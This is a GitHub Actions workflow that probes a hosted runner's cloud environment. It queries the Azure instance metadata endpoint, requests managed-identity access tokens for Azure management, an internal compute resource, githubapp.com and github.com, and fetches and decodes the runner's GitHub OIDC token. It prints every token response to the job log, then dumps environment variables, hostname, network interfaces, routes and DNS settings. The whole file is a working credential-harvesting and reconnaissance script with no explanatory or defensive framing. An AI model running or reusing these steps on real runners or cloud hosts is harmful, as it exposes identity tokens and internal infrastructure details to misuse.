name: "IMDS & Environment Test"
on:
  workflow_dispatch:

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Azure IMDS - Full instance with identities
        run: |
          echo "=== FULL INSTANCE METADATA ==="
          curl -s -m 2 "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json" -H "Metadata: true"
          echo ""
          echo "=== IDENTITY SECTION ==="
          # Check if there are user-assigned identities
          curl -s -m 2 "http://169.254.169.254/metadata/instance/compute/azEnvironment?api-version=2021-02-01&format=text" -H "Metadata: true"
          echo ""
          
      - name: Azure IMDS - Identity token for management.azure.com
        run: |
          echo "=== MSI TOKEN FOR AZURE MANAGEMENT ==="
          RESPONSE=$(curl -s -m 5 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true")
          echo "Response: $RESPONSE"
          
      - name: Azure IMDS - Identity token for hosted-compute-ro
        run: |
          echo "=== MSI TOKEN FOR hosted-compute-ro ==="
          RESPONSE=$(curl -s -m 5 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=api://hosted-compute-ro" -H "Metadata: true")
          echo "Response: $RESPONSE"
          
      - name: Azure IMDS - Identity token for GitHub apps
        run: |
          echo "=== MSI TOKEN FOR githubapp.com ==="
          RESPONSE=$(curl -s -m 5 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://githubapp.com" -H "Metadata: true")
          echo "Response1: $RESPONSE"
          
          echo "=== MSI TOKEN FOR github.com ==="
          RESPONSE2=$(curl -s -m 5 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://github.com" -H "Metadata: true")
          echo "Response2: $RESPONSE2"

      - name: GitHub OIDC token
        env:
          ACTIONS_ID_TOKEN_REQUEST_URL: ${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
          ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${{ env.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}
        run: |
          echo "=== GitHub OIDC Token ==="
          echo "Token URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
          OIDC_RESPONSE=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"             -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
          echo "OIDC Response: $OIDC_RESPONSE"
          
          # Decode the JWT claims
          TOKEN=$(echo "$OIDC_RESPONSE" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('value',''))" 2>/dev/null)
          if [ -n "$TOKEN" ]; then
            echo "JWT Header: $(echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null)"
            echo "JWT Claims: $(echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps(d,indent=2))" 2>/dev/null)"
          fi
          
      - name: Check runner secrets and env
        run: |
          echo "=== Runner environment (filtered) ==="
          env | sort | grep -v "^ACTIONS_RUNTIME" | grep -v "SECRET" | head -50
          
          echo "=== AZURE-related env ==="
          env | grep -i "azure\|arm_\|msi\|identity\|client_id\|tenant\|subscription\|storage_account" || echo "None found"
          
          echo "=== Hostname ==="
          hostname
          cat /etc/hostname
          
          echo "=== Network interfaces ==="
          ip addr show | grep "inet " | head -10
          
          echo "=== Routes ==="
          ip route | head -10
          
          echo "=== DNS ==="
          cat /etc/resolv.conf
